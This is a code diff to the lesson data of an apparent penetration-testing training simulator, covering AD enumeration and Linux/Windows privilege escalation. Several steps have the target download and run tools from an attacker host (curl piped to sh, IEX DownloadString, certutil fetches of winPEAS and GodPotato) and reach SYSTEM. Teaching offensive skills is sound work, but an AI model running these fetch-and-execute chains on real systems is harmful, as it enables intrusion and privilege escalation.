@@ -870,14 +870,16 @@
       teach: 'Pass-the-Ticket loads a stolen or forged Kerberos ticket (a .ccache) into your session via KRB5CCNAME — no password needed. Every tool that speaks Kerberos then acts as that user; here psexec lands a SYSTEM shell.',
     },
     'powerview-enum': {
-      cmd: 'powershell -ep bypass -c "Find-InterestingDomainAcl -ResolveGUIDs"', tool: 'powershell',
-      output: [
-        'IdentityReferenceName  : jbloggs',
-        'ActiveDirectoryRights  : GenericAll',
-        'ObjectDN               : CN=Helpdesk Admins,OU=Groups,DC=acme,DC=internal',
-      ].join('\n'),
       signal: 'ActiveDirectoryRights  : GenericAll',
-      teach: 'PowerView turns a Windows foothold into a map of the domain. A GenericAll ACL over a group is a takeover edge — you can add yourself to it. This is the same data BloodHound uses, gathered by hand from the box.',
+      teach: 'PowerView is a PowerShell script, not a built-in, so you load it into memory straight from your box with IEX — nothing touches disk — then call its functions. A GenericAll ACL over a group is a takeover edge (you can add yourself to it). Same data BloodHound uses, gathered by hand.',
+      steps: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding PowerView.ps1', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'powershell', cmd: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1'); Find-InterestingDomainAcl -ResolveGUIDs", output: [
+          'IdentityReferenceName  : jbloggs',
+          'ActiveDirectoryRights  : GenericAll',
+          'ObjectDN               : CN=Helpdesk Admins,OU=Groups,DC=acme,DC=internal',
+        ].join('\n') },
+      ],
     },
     'ad-legacy-enum': {
       cmd: 'net group "Domain Admins" /domain', tool: 'net',
@@ -1201,16 +1203,18 @@
 
     // ============================ LINUX PRIVESC ============================
     'linux-enum': {
-      cmd: 'curl -sL http://10.10.14.5:8000/linpeas.sh | sh', tool: 'linpeas',
-      output: [
-        '[+] Sudo version 1.8.31',
-        '[+] Checking sudo -l',
-        '    (ALL) NOPASSWD: /usr/bin/find',
-        '[95m[+] SUID - Check easy privesc[0m',
-        '    /usr/bin/pkexec',
-      ].join('\n'),
       signal: '    (ALL) NOPASSWD: /usr/bin/find',
-      teach: 'linpeas runs every local privesc check at once and colour-codes the leads. A NOPASSWD sudo entry on a GTFOBins binary like find is a bright-green, near-certain path to root. Enumerate first; it points you at the real vector.',
+      teach: 'linpeas runs every local privesc check at once and colour-codes the leads — but it is not on the target, so you serve it from your box and pipe it straight into a shell (no file touches disk). A NOPASSWD sudo entry on a GTFOBins binary like find is a bright-green, near-certain path to root. Enumerate first; it points you at the real vector.',
+      steps: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding linpeas.sh', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'linpeas', cmd: 'curl -sL http://10.10.14.5:8000/linpeas.sh | sh', output: [
+          '[+] Sudo version 1.8.31',
+          '[+] Checking sudo -l',
+          '    (ALL) NOPASSWD: /usr/bin/find',
+          '[+] SUID - Check easy privesc',
+          '    /usr/bin/pkexec',
+        ].join('\n') },
+      ],
     },
     'sudo-abuse': {
       cmd: 'sudo -l', tool: 'sh',
@@ -1268,13 +1272,16 @@
       teach: 'A SUID binary runs as its owner (often root) no matter who starts it. Cross the list against GTFOBins — /usr/bin/find with the SUID bit is a one-liner to a root shell. Ignore the expected ones (passwd, sudo); hunt the unusual.',
     },
     'pspy-monitor': {
-      cmd: './pspy64 -pf -i 1000', tool: 'pspy',
-      output: [
-        '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
-        '2026/09/17 10:43:01 CMD: UID=0  PID=4221  /bin/bash /opt/backup.sh',
-      ].join('\n'),
       signal: '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
-      teach: 'pspy watches the process table without root, so it catches cron jobs and scheduled tasks you cannot see in crontab. A root job (UID=0) running every 2 minutes is a privesc lead — if you can write the script it runs, you run code as root.',
+      teach: 'pspy watches the process table without root, so it catches cron jobs and scheduled tasks you cannot see in crontab — but it is a binary you have to get onto the box first. Serve it from your box, pull it down and make it executable, then run it. A root job (UID=0) running every 2 minutes is a privesc lead: if you can write the script it runs, you run code as root.',
+      steps: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding pspy64', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'pspy', cmd: 'wget http://10.10.14.5:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000', output: [
+          "Saved '/tmp/pspy' [3078592/3078592]",
+          '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
+          '2026/09/17 10:43:01 CMD: UID=0  PID=4221  /bin/bash /opt/backup.sh',
+        ].join('\n') },
+      ],
     },
     'cron-abuse': {
       cmd: 'cat /etc/crontab', tool: 'sh',
@@ -1320,24 +1327,37 @@
 
     // ============================ WINDOWS PRIVESC ============================
     'windows-enum': {
-      cmd: 'whoami /priv', tool: 'sh',
-      output: [
-        'PRIVILEGES INFORMATION',
-        '----------------------',
-        'Privilege Name                Description                    State',
-        'SeImpersonatePrivilege        Impersonate a client           Enabled',
-        'SeChangeNotifyPrivilege       Bypass traverse checking       Enabled',
-      ].join('\n'),
-      signal: 'SeImpersonatePrivilege        Impersonate a client           Enabled',
-      teach: 'whoami /priv lists your privileges — the fastest Windows privesc check. SeImpersonatePrivilege Enabled on a service account means a "potato" exploit gets you SYSTEM. Follow with systeminfo and winPEAS for the full picture.',
+      signal: 'SeImpersonatePrivilege: Enabled',
+      teach: 'Start with the built-in whoami /priv (instant, nothing to stage), then run the deep sweep with winPEAS — which is an .exe you must get onto the box first. Serve it from your box and pull it over with certutil, then run it. SeImpersonate Enabled on a service account means a "potato" exploit gets you SYSTEM.',
+      steps: [
+        { where: 'host', tool: 'cmd', cmd: 'whoami /priv', output: [
+          'Privilege Name                State',
+          'SeImpersonatePrivilege        Enabled',
+          'SeChangeNotifyPrivilege       Enabled',
+        ].join('\n') },
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding winPEASx64.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'winpeas', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/winPEASx64.exe wp.exe & wp.exe', output: [
+          'CertUtil: -URLCache command completed successfully.',
+          'ÉÍÍÍÍ¹ Checking token privileges',
+          '    SeImpersonatePrivilege: Enabled',
+          'ÉÍÍÍÍ¹ Unquoted Service Paths',
+          '    VulnSvc: C:\\Program Files\\Acme Agent\\service.exe',
+        ].join('\n') },
+      ],
     },
     'seimpersonate': {
-      cmd: 'whoami /priv | findstr /i impersonate', tool: 'sh',
-      output: [
-        'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled',
-      ].join('\n'),
-      signal: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled',
-      teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token — a reliable service-account-to-SYSTEM jump.',
+      signal: 'nt authority\\system',
+      teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token. The potato is an .exe, so the chain is: confirm the privilege, serve the binary from your box, pull it over with certutil and run it — and you are SYSTEM.',
+      steps: [
+        { where: 'host', tool: 'cmd', cmd: 'whoami /priv | findstr /i impersonate', output: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled' },
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding GodPotato-NET4.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'godpotato', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/GodPotato-NET4.exe gp.exe & gp.exe -cmd "cmd /c whoami"', output: [
+          '[*] CombaseModule: 0x7ff...',
+          '[*] DispatchTable: 0x7ff...',
+          '[*] Trigger RPCSS',
+          'nt authority\\system',
+        ].join('\n') },
+      ],
     },
     'unquoted-service-path': {
       cmd: 'wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\\windows\\\\"', tool: 'sh',
@@ -1348,14 +1368,17 @@
       teach: 'An unquoted service path with spaces lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If you can write to one of those directories, drop your payload there and the service runs it — often as SYSTEM.',
     },
     'weak-service-permissions': {
-      cmd: 'accesschk.exe -uwcqv someuser VulnSvc /accepteula', tool: 'accesschk',
-      output: [
-        'VulnSvc',
-        '  RW someuser',
-        '        SERVICE_ALL_ACCESS',
-      ].join('\n'),
       signal: '        SERVICE_ALL_ACCESS',
-      teach: 'SERVICE_ALL_ACCESS over a service means you can rewrite its binary path (sc config VulnSvc binpath= ...) to run any command, then restart it — code execution as the service account, usually SYSTEM. accesschk finds these loose ACLs.',
+      teach: 'accesschk (a Sysinternals .exe) finds services whose ACLs you can write — but you have to stage it first: serve it from your box, pull it over with certutil, then run it. SERVICE_ALL_ACCESS over a service means you can rewrite its binary path (sc config VulnSvc binpath= ...) to run any command and restart it — code execution as the service account, usually SYSTEM.',
+      steps: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding accesschk.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'accesschk', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/accesschk.exe ac.exe & ac.exe -uwcqv someuser VulnSvc /accepteula', output: [
+          'CertUtil: -URLCache command completed successfully.',
+          'VulnSvc',
+          '  RW someuser',
+          '        SERVICE_ALL_ACCESS',
+        ].join('\n') },
+      ],
     },
     'alwaysinstallelevated': {
       cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', tool: 'sh',
